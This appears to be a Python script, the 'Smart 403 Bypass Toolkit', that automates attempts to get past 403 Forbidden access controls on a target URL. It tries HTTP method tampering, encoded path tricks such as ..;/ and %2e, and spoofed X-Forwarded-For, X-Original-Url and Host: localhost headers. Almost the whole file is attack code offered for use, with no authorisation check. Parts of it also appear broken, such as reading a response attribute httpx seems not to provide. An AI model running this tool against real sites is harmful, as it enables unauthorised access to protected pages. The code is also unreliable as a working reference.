import asyncio
import httpx
import argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from collections import namedtuple
import json
import sys
import os

# --- Constants and Configuration ---
# Define common user agents to rotate through
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/108.0.1462.46",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/108.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

# Define common IP addresses for X-Forwarded-For, etc.
COMMON_IPS = [
    "127.0.0.1", "localhost", "0.0.0.0", "127.0.0.1%00",
    "10.0.0.1", "192.168.1.1", "172.16.0.1"
]

# Result structure for successful bypasses
BypassResult = namedtuple('BypassResult', ['url', 'method', 'headers', 'status_code', 'content_length', 'technique'])

# --- Core Bypass Logic ---

class Smart403Bypass:
    def __init__(self, target_url, initial_status_code, initial_content_length,
                 proxy=None, timeout=10, verify_ssl=True, cookies=None,
                 custom_headers=None, follow_redirects=True, verbose=False):
        """
        Initializes the 403 Bypass Toolkit.

        Args:
            target_url (str): The URL to test for 403 bypass.
            initial_status_code (int): The original status code received for the target URL.
            initial_content_length (int): The original content length received for the target URL.
            proxy (str, optional): Proxy URL (e.g., "http://127.0.0.1:8080"). Defaults to None.
            timeout (int, optional): Request timeout in seconds. Defaults to 10.
            verify_ssl (bool, optional): Whether to verify SSL certificates. Defaults to True.
            cookies (dict, optional): Dictionary of cookies to send with requests. Defaults to None.
            custom_headers (dict, optional): Dictionary of custom headers to add to all requests. Defaults to None.
            follow_redirects (bool, optional): Whether to follow HTTP redirects. Defaults to True.
            verbose (bool, optional): Enable verbose output for all attempts. Defaults to False.
        """
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.base_path = self.parsed_url.path.rstrip('/')
        self.original_status_code = initial_status_code
        self.original_content_length = initial_content_length
        self.proxy = proxy
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.cookies = cookies if cookies else {}
        self.custom_headers = custom_headers if custom_headers else {}
        self.follow_redirects = follow_redirects
        self.verbose = verbose
        self.successful_bypasses = []
        self.client = httpx.AsyncClient(
            proxies={"http://": proxy, "https://": proxy} if proxy else None,
            timeout=timeout,
            verify=verify_ssl,
            follow_redirects=follow_redirects,
            cookies=cookies
        )

    async def _make_request(self, method, url, headers=None, data=None, json=None, technique_name=""):
        """
        Makes an asynchronous HTTP request and checks for bypass.

        Args:
            method (str): HTTP method (GET, POST, etc.).
            url (str): The URL to request.
            headers (dict, optional): Headers for the request. Defaults to None.
            data (dict/str, optional): Form data for POST/PUT requests. Defaults to None.
            json (dict, optional): JSON data for POST/PUT requests. Defaults to None.
            technique_name (str): Name of the bypass technique used.

        Returns:
            BypassResult or None: If a bypass is successful, returns a BypassResult tuple, otherwise None.
        """
        request_headers = {
            "User-Agent": USER_AGENTS[0], # Use first UA by default, could rotate later
            **self.custom_headers,
            **(headers if headers else {})
        }

        try:
            response = await self.client.request(method, url, headers=request_headers, data=data, json=json)

            # Check for bypass conditions
            is_bypassed = False
            reason = ""

            # Condition 1: Status code is 2xx
            if 200 <= response.status_code < 300:
                is_bypassed = True
                reason = f"Status 2xx ({response.status_code})"
            # Condition 2: Status code is 3xx and not original 403
            elif 300 <= response.status_code < 400 and response.status_code != self.original_status_code:
                is_bypassed = True
                reason = f"Redirect ({response.status_code})"
            # Condition 3: Status code is not 403 and not original status code
            elif response.status_code != 403 and response.status_code != self.original_status_code:
                is_bypassed = True
                reason = f"Different Status ({response.status_code})"
            # Condition 4: Content length significantly different (e.g., > 10% difference)
            elif abs(response.content_length - self.original_content_length) > (self.original_content_length * 0.1):
                is_bypassed = True
                reason = f"Content Length Change ({response.content_length} vs {self.original_content_length})"

            if self.verbose:
                print(f"  [Attempt] {technique_name} | {method} {url} | Status: {response.status_code} | Length: {response.content_length}")

            if is_bypassed:
                result = BypassResult(
                    url=url,
                    method=method,
                    headers=request_headers,
                    status_code=response.status_code,
                    content_length=response.content_length,
                    technique=f"{technique_name} ({reason})"
                )
                self.successful_bypasses.append(result)
                print(f"\n[+] BYPASS SUCCESS! {result.technique}")
                print(f"    URL: {result.url}")
                print(f"    Method: {result.method}")
                print(f"    Status: {result.status_code}")
                print(f"    Length: {result.content_length}")
                print(f"    Headers: {json.dumps(result.headers, indent=2)}\n")
                return result
        except httpx.RequestError as e:
            if self.verbose:
                print(f"  [Error] {technique_name} | {method} {url} | Request failed: {e}")
        except Exception as e:
            if self.verbose:
                print(f"  [Error] {technique_name} | {method} {url} | An unexpected error occurred: {e}")
        return None

    async def _test_method_bypass(self):
        """Tests various HTTP methods."""
        print("[*] Testing HTTP Method bypasses...")
        methods = ["HEAD", "POST", "PUT", "PATCH", "OPTIONS", "TRACE", "CONNECT", "PROPFIND"]
        tasks = []
        for method in methods:
            tasks.append(self._make_request(method, self.target_url, technique_name=f"Method: {method}"))
        await asyncio.gather(*tasks)

    async def _test_path_bypass(self):
        """Tests various path manipulations."""
        print("[*] Testing Path Manipulation bypasses...")
        path_variations = [
            # Trailing slashes and dots
            f"{self.base_path}/.",
            f"{self.base_path}/..;/.",
            f"{self.base_path}/;/",
            f"{self.base_path}/%2e",
            f"{self.base_path}/%2e/",
            f"{self.base_path}/%2e%2f",
            f"{self.base_path}/./",
            f"{self.base_path}/;.",
            f"{self.base_path}/;..",
            f"{self.base_path}/;../",
            f"{self.base_path}//", # Double slash
            f"{self.base_path}/%2f", # Encoded slash
            f"/%2f{self.parsed_url.path.lstrip('/')}", # Leading encoded slash
            f"{self.base_path}/%09", # Tab character
            f"{self.base_path}%00", # Null byte (might not work over HTTP)
            f"{self.base_path}.json", # Appending common extensions
            f"{self.base_path}.html",
            f"{self.base_path}.php",
            f"{self.base_path}.xml",
            f"{self.base_path}.js",
            f"{self.base_path}?", # Appending empty query
            f"{self.base_path}#", # Appending fragment
            f"{self.base_path}.css",
            f"{self.base_path}.gif",
            f"{self.base_path}.jpg",
            f"{self.base_path}.png",
            f"{self.base_path}..%2f", # Dot-dot-slash encoded
            f"{self.base_path}%2f..", # Slash-dot-dot encoded
            f"{self.base_path}/%252e%252f", # Double encoded dot slash
            f"{self.base_path}/%u002f", # Unicode encoded slash
            f"{self.base_path}/%u002e", # Unicode encoded dot
        ]

        # Add query parameters to existing path
        if self.parsed_url.query:
            original_query_params = parse_qs(self.parsed_url.query)
        else:
            original_query_params = {}

        # Add common query parameters
        common_query_params = ["id", "file", "name", "path", "view", "page", "resource"]
        for param in common_query_params:
            modified_query_params = original_query_params.copy()
            modified_query_params[param] = [""] # Add empty value
            path_variations.append(f"{self.base_path}?{urlencode(modified_query_params, doseq=True)}")

        tasks = []
        for variation in path_variations:
            full_url = urljoin(self.target_url, variation)
            tasks.append(self._make_request("GET", full_url, technique_name=f"Path: {variation.replace(self.base_path, '')}"))
            tasks.append(self._make_request("POST", full_url, technique_name=f"Path (POST): {variation.replace(self.base_path, '')}"))
        await asyncio.gather(*tasks)

    async def _test_header_bypass(self):
        """Tests various header manipulations."""
        print("[*] Testing Header Manipulation bypasses...")
        tasks = []

        # X-Original-URL / X-Rewrite-URL
        for header_name in ["X-Original-Url", "X-Rewrite-Url", "X-Proxy-Url"]:
            headers = {header_name: f"/{self.parsed_url.path.lstrip('/')}"}
            tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name=f"Header: {header_name}"))

        # X-Forwarded-For / X-Real-IP / X-Custom-IP-Authorization
        for header_name in ["X-Forwarded-For", "X-Real-IP", "X-Custom-IP-Authorization"]:
            for ip in COMMON_IPS:
                headers = {header_name: ip}
                tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name=f"Header: {header_name}: {ip}"))
                # Also try with Host header manipulation
                headers_with_host = {**headers, "Host": "localhost"}
                tasks.append(self._make_request("GET", self.target_url, headers=headers_with_host, technique_name=f"Header: {header_name}: {ip} + Host: localhost"))


        # Referer header
        headers = {"Referer": f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/admin"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name="Header: Referer: /admin"))
        headers = {"Referer": "https://google.com"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name="Header: Referer: google.com"))


        # Host header manipulation
        headers = {"Host": "localhost"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name="Header: Host: localhost"))
        headers = {"Host": f"{self.parsed_url.netloc}:8080"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name=f"Header: Host: {self.parsed_url.netloc}:8080"))

        # Content-Type manipulation (for POST requests)
        content_types = [
            "application/json",
            "application/xml",
            "text/plain",
            "application/x-www-form-urlencoded",
        ]
        for ctype in content_types:
            headers = {"Content-Type": ctype}
            # Try with empty body for POST
            tasks.append(self._make_request("POST", self.target_url, headers=headers, data="", technique_name=f"Header: Content-Type: {ctype} (empty body)"))
            # Try with a simple JSON/form body
            if ctype == "application/json":
                tasks.append(self._make_request("POST", self.target_url, headers=headers, json={"id": 1}, technique_name=f"Header: Content-Type: {ctype} (json body)"))
            elif ctype == "application/x-www-form-urlencoded":
                tasks.append(self._make_request("POST", self.target_url, headers=headers, data="id=1", technique_name=f"Header: Content-Type: {ctype} (form body)"))

        # Origin header
        headers = {"Origin": "null"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name="Header: Origin: null"))
        headers = {"Origin": f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name=f"Header: Origin: {self.parsed_url.netloc}"))

        # Accept header
        headers = {"Accept": "*/*"}
        tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name="Header: Accept: */*"))

        # User-Agent rotation (already handled by default header, but explicit test)
        for ua in USER_AGENTS:
            headers = {"User-Agent": ua}
            tasks.append(self._make_request("GET", self.target_url, headers=headers, technique_name=f"Header: User-Agent: {ua[:30]}..."))

        await asyncio.gather(*tasks)

    async def run(self):
        """Runs all bypass tests."""
        # First, confirm the original 403 status and content length
        try:
            print(f"[*] Initializing scan for: {self.target_url}")
            print(f"[*] Original Status: {self.original_status_code}, Original Content Length: {self.original_content_length}")

            # Run all bypass tests concurrently
            await self._test_method_bypass()
            await self._test_path_bypass()
            await self._test_header_bypass()

            # Close the HTTP client
            await self.client.aclose()

            print("\n--- Scan Complete ---")
            if self.successful_bypasses:
                print(f"[+] Found {len(self.successful_bypasses)} potential bypasses:")
                for i, result in enumerate(self.successful_bypasses):
                    print(f"  {i+1}. Technique: {result.technique}")
                    print(f"     URL: {result.url}")
                    print(f"     Method: {result.method}")
                    print(f"     Status: {result.status_code}")
                    print(f"     Length: {result.content_length}")
            else:
                print("[-] No bypasses found with the tested techniques.")

        except Exception as e:
            print(f"[CRITICAL ERROR] An error occurred during the scan: {e}", file=sys.stderr)
            await self.client.aclose()


# --- CLI Argument Parsing ---
def main():
    parser = argparse.ArgumentParser(
        description="Smart 403 Bypass Toolkit - A tool for discovering ways to bypass 403 Forbidden responses.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/admin)")
    parser.add_argument("-p", "--proxy", help="HTTP/S proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--no-ssl-verify", action="store_false", dest="verify_ssl", help="Disable SSL certificate verification")
    parser.add_argument("-c", "--cookies", help="Cookies to send (e.g., 'session=abc; auth=xyz'). Use quotes for multiple.")
    parser.add_argument("-H", "--header", action="append", help="Add a custom header (e.g., 'Authorization: Bearer token'). Can be used multiple times.")
    parser.add_argument("--no-redirects", action="store_false", dest="follow_redirects", help="Do not follow HTTP redirects")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output for all attempts")

    args = parser.parse_args()

    # Process custom headers
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                key, value = h.split(':', 1)
                custom_headers[key.strip()] = value.strip()
            else:
                print(f"[WARNING] Invalid header format: '{h}'. Use 'Key: Value'. Skipping.", file=sys.stderr)

    # Process cookies
    parsed_cookies = {}
    if args.cookies:
        try:
            for cookie_pair in args.cookies.split(';'):
                if '=' in cookie_pair:
                    key, value = cookie_pair.split('=', 1)
                    parsed_cookies[key.strip()] = value.strip()
        except Exception as e:
            print(f"[WARNING] Could not parse cookies: {e}. Ignoring cookies.", file=sys.stderr)
            parsed_cookies = {}

    # Initial check for 403 and content length
    print(f"[*] Performing initial request to {args.url} to determine baseline...")
    try:
        # Use a temporary client for the initial request
        temp_client = httpx.Client(
            proxies={"http://": args.proxy, "https://": args.proxy} if args.proxy else None,
            timeout=args.timeout,
            verify=args.verify_ssl,
            follow_redirects=args.follow_redirects,
            cookies=parsed_cookies,
            headers={"User-Agent": USER_AGENTS[0], **custom_headers}
        )
        initial_response = temp_client.get(args.url)
        temp_client.close()

        if initial_response.status_code != 403:
            print(f"[!] The target URL returned status code {initial_response.status_code}, not 403 Forbidden.")
            print(f"[!] This tool is designed for 403 bypass. Results might not be relevant.")
            # Still proceed, but warn the user
        
        initial_status = initial_response.status_code
        initial_content_length = initial_response.content_length
        
    except httpx.RequestError as e:
        print(f"[ERROR] Initial request failed: {e}. Please check the URL and network connectivity.", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred during initial request: {e}", file=sys.stderr)
        sys.exit(1)

    # Initialize and run the bypass toolkit
    bypass_toolkit = Smart403Bypass(
        target_url=args.url,
        initial_status_code=initial_status,
        initial_content_length=initial_content_length,
        proxy=args.proxy,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl,
        cookies=parsed_cookies,
        custom_headers=custom_headers,
        follow_redirects=args.follow_redirects,
        verbose=args.verbose
    )
    asyncio.run(bypass_toolkit.run())

if __name__ == "__main__":
    main()
